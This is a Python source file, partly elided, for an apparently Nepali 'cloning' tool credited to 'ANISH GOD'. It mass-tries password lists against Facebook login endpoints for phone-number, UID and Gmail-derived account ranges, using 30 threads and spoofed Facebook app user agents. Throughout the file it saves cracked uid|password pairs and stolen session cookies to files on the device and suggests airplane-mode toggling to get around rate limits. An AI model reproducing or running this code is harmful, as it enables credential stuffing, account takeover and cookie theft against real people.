...
print(f'\x1b[1;91m[\x1b[1;92m✓\x1b[1;91m]\x1b[1;97m SYSTEM LOADING INSTALLED ')
try:
...
os.system("xdg-open https://www.facebook.com/1281799018/posts/pfbid03H11hakXy7HdhLiPpaQZF3NScQTdrD8sksoAVDGdJxztyMXKmQhXNP4wDhCWTcZNl/?app=fbl")
...
\t\x1b[1;96m╚═╝░░╚═╝╚═╝░░╚══╝╚═╝╚═════╝░╚═╝░░╚═╝
{A}--------------------------------------------------
{R}[{X}={R}]{A} DEVELOPER  {GOD}<>  {A} ANISH GOD
{R}[{X}={R}]{A} REGIONAL   {GOD}<>  {A} NEPAL
{R}[{X}={R}]{A} FEATURE    {GOD}<>  {A} FILE × RANDOM
{R}[{X}={R}]{A} VERSION    {GOD}<>  {X} TESTING
{A}--------------------------------------------------""")

def Main_Anish():
        clear()
        print(f"{R}[{X}1{R}]{A} FILE CLONING")
        print(f"{R}[{X}2{R}]{A} RANDOM CLONING")
        print(f"{R}[{X}0{R}]{A} EXIT PROGRAM")
        linex()
        opt1 = input(f"{R}[{G}!{R}]{A} SELECT {R}<{C}/{R}>{X} ")
        if opt1 == "1": file()   
        elif opt1 == "2":
            clear();print(f'{R}[{X}1{R}]{GOD} ● {A}BD UID CLONING');print(f'{R}[{X}2{R}]{GOD} ● {A}INDIA UID CLONING');print(f'{R}[{X}3{R}]{GOD} ● {A}GMAIL NUMBER CLONING');linex()
            opt = input(f"{R}[{X}!{R}]{A} SELECT {R}<{C}/{R}>{X} ")
            if opt == '1': bd()
            if opt == '2':ind()
            if opt== '3':gmail()
            else:linex();print(f'{R}[{X}!{R}]{A} SELECTED WRONG OPTION ');time.sleep(2);Main_Anish()
            if d == '0':Main_Anish()
            else:linex();print(f'{R}[{X}!{R}]{A} SELECTED WRONG OPTION ');time.sleep(2);Main_Anish()
 
        elif opt1 == "0":linex();print(f'{R}[{X}✓{R}]{A} EXIT DONE BROTHER ');exit()
        else:linex();print(f'{R}[{X}!{R}]{A} SELECTED WRONG OPTION ');time.sleep(2);Main_Anish()
 
def file():
    clear();print(f"{R}[{X}●{R}]{A} EXAMPLE {R}<{C}/{R}> {X}/sdcard/File.txt {A}");linex()
    file = input(f"{R}[{X}!{R}]{A} FILE PATH {R}<{C}/{R}>{X} ")
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        linex();print(f'{R}[{X}!{R}]{A} FILE LOCATION NOT FOUND ');time.sleep(2);file()
    clear();print(f'{R}[{X}1{R}]{GOD} ● {A}METHOD {R}[{X}m1{R}]{A} ');print(f'{R}[{X}2{R}]{GOD} ● {A}METHOD {R}[{X}m2{R}]{A} ');linex()
    methd=input(f"{R}[{X}!{R}]{A} SELECT {R}<{C}/{R}>{X} ")
    plist=[]
    clear() 
    try:
        ps_limit = int(input((f"{R}[{X}!{R}]{A} PASSWORD LIMIT {R}<{C}/{R}>{X} ")))
    except:
        ps_limit =1
    clear()
    print(f'{R}[{X}●{R}]{A} EXAMPLE {R}<{C}/{R}>{X} firstlast {A}|{X} first@@ {A}');linex()
    for i in range(ps_limit):
        plist.append(input(f"{R}[{X}✓{R}]{A} PASSWORD NO {R}[{X}%s{R}]{A} {R}<{C}/{R}>{X} "%(i+1)))
    with tred(max_workers=30) as ANISH:
        clear()
        tl = str(len(fo))
        print(f'{R}[{X}●{R}]{A} TOTAL ACCOUNT {R}<{C}/{R}>{X}',tl)
        print(f'{R}[{X}●{R}]{A} IF YOU NO RESULT {R}[{X}ON{A}/{GOD}OFF{R}]{A} AIRPLANE MODE ');linex()
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if methd =='1':
                ANISH.submit(api1,ids,names,passlist)
            elif methd =='2':
                ANISH.submit(api2,ids,names,passlist)
            else:
                ANISH.submit(api1,ids,names,passlist)
            
    print(f'\r{A}--------------------------------------------------')
    print(f"{R}[{X}✓{R}]{A} CLONING HAS BEEN COMPLETED ")
    print(f'{R}[{X}✓{R}]{A} TOTAL OK IDs {R}<{C}/{R}>{X} '+str(len(oks)))
    print(f"{R}[{X}✓{R}]{A} CLONING ACCOUNTS SAVED IN /sdcard/ANISH.txt")
    print(f'\r{A}--------------------------------------------------')
    input(f"{R}[{X}!{R}]{A} PRESS ENTER TO GO BACK ")
    os.system('python Anish.py')
 
def bd():
                user=[]
                clear()
                print(f'{R}[{X}●{R}]{A} EXAMPLE {R}<{C}/{R}>{X} 017 {A}|{X} 019 {A}|{X} 018 {A}|{X} 016');linex()
                code = input(f"{R}[{X}!{R}]{A} SELECT {R}<{C}/{R}>{X} ")
                try:                    
                        clear();print(f'{R}[{X}●{R}]{A} EXAMPLE {R}<{C}/{R}>{X} 3000 {A}|{X} 5000 {A}|{X} 10000 {A}|{X} 9999');linex()
                        limit = int(input(f'{R}[{X}!{R}]{A} SELECT {R}<{C}/{R}>{X} '))
                except ValueError:
                        limit = 5000
                ...
                with tred(max_workers=30) as ANISH:     
                        ...
                        tl = str(len(user))
                        print(f'{R}[{X}●{R}]{A} TOTAL ACCOUNT {R}<{C}/{R}>{X}',tl)
                        print(f'{R}[{X}●{R}]{A} SIM CODE {R}<{C}/{R}>{GOD}',code)
                        print(f'{R}[{X}●{R}]{A} IF YOU NO RESULT {R}[{X}ON{A}/{GOD}OFF{R}]{A} AIRPLANE MODE ');linex()
                        for psx in user:
                                ids = code+psx
...
def ind():
                user=[]
                clear()
                print(f'{R}[{X}●{R}]{A} EXAMPLE {R}<{C}/{R}>{X} +91639 {A}|{X} +91620 {A}|{X} +91720 {A}|{X} +91789');linex()
                code = input(f"{R}[{X}!{R}]{A} SELECT {R}<{C}/{R}>{X} ")
                try:                    
                        clear();print(f'{R}[{X}●{R}]{A} EXAMPLE {R}<{C}/{R}>{X} 3000 {A}|{X} 5000 {A}|{X} 10000 {A}|{X} 9999');linex()
                        limit = int(input(f'{R}[{X}!{R}]{A} SELECT {R}<{C}/{R}>{X} '))
...
def gmail():
                ...
                clear()
                print(f'{R}[{X}●{R}]{A} EXAMPLE {R}<{C}/{R}>{X} Rakib {A}|{X} Sakib {A}|{X} Ariyan {A}|{X} Roman');linex()
                first = input(f'{R}[{X}!{R}]{A} FIRST NAME {R}<{C}/{R}>{X} ')
                clear()
                print(f'{R}[{X}●{R}]{A} EXAMPLE {R}<{C}/{R}>{X} khan {A}|{X} Islam {A}|{X} ali {A}|{X} Ahmed');linex()
                last = input(f'{R}[{X}!{R}]{A} LAST NAME {R}<{C}/{R}>{X} ')
                clear()
                print(f'{R}[{X}●{R}]{A} EXAMPLE {R}<{C}/{R}>{X} @gmail.com {A}|{X} @yahoo.com {A}');linex()
                domain = input(f"{R}[{X}!{R}]{A} SELECT {R}<{C}/{R}>{X} ")
                clear()
                print(f'{R}[{X}●{R}]{A} EXAMPLE {R}<{C}/{R}>{X} 3000 {A}|{X} 5000 {A}|{X} 10000 {A}|{X} 9999');linex()
                try:
                        limit=int(input(f'{R}[{X}!{R}]{A} SELECT {R}<{C}/{R}>{X} '))
                ...
                with tred(max_workers=30) as ANISH:
                        total = str(len(fo))
                        clear()
                        print(f'{R}[{X}●{R}]{A} TOTAL ACCOUNT {R}<{C}/{R}>{X} '+total);print(f'{R}[{X}●{R}]{A} TARGET FULL NAME {R}<{C}/{R}>{X} '+first+last+domain);print(f'{R}[{X}●{R}]{A} IF YOU NO RESULT {R}[{X}ON{A}/{GOD}OFF{R}]{A} AIRPLANE MODE ');linex()
                        for user in fo:
                                ids,names = user.split('|')
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write(f'\r{R}[{X}ANISH-GOD{R}]{A}={R}[{X}%s{R}]{A}={R}[{X}OK{R}]{A}={R}[{X}%s{R}] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        status= lock(uid)
                        if "Active" in status:
                        	print(f'\r{R}[{X}ANISH-OK{R}]{X} '+uid+f' {R}|{X} '+pas)
                        print(f"\r{R}[{X}COOKIE{R}] {R}<{C}/{R}>{A} {cookie}")
                        file_path_ok = os.path.join(folder_path, 'ANISH-RANDOM-OK.txt')
                        file_path_cookies = os.path.join(folder_path, 'ANISH-RANDOM-COOKIE.txt')
                        ...
                        print(f'\r{R}[{Y}ANISH-CP{R}]{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                        file_path = os.path.join(folder_path, 'ANISH-RANDOM-CP.txt')
...
##------------[ FILE METHOD (1) ]-----------##
def sex():
	fban = random.choice(["FBAN", "FB4A"])
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	fbcr = random.choice(['Nepal_Telecom', 'Banglalink', 'Robi', 'Grameenphone', 'Airtel', 'Zong', 'Telenor'])
	fblc = random.choice(["en_US", "en_GB", "np_NP", "de_DE", "it_IT", "ru_RU", "zh_CN", "ja_JP", "fr_FR", "es_ES"])
	fbbd = (["Samsung", "Huawei", "iPhone", "Google", "ASUS", "Sony", "LG", "Xiaomi", "Motorola",
    ...
    "Vivo", "Xiaomi", "ZTE"])
	fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.ads"])
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    print(f'\r{R}[{X}ANISH-OK{R}]{X} '+uid+f' {R}|{X} '+pas)
                    print(f"\r{R}[{X}Cookie{R}]{R} <{C}/{R}>{A} {cookie}")
                    file_path = os.path.join(folder_path, 'ANISH_FILE_M1_OK.txt')
                    open('/sdcard/ANISH/ANISH_FILE_M1_OK_COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}[{Y}ANISH-CP{R}]{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'ANISH_FILE_M1_CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}[{X}ANISH-OK{R}] '+uid+f' {R}|{X} '+pas)
                    print(f"\r{R}[{X}COOKIE{R}]{R} <{C}/{R}>{X} {cookie}")
                    file_path = os.path.join(folder_path, 'ANISH_FILE_M2_OK.txt')
                    open('/sdcard/ANISH/ANISH_FILE_M2_OK_COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}[{Y}ANISH-CP{R}]{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'ANISH_FILE_M2_CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
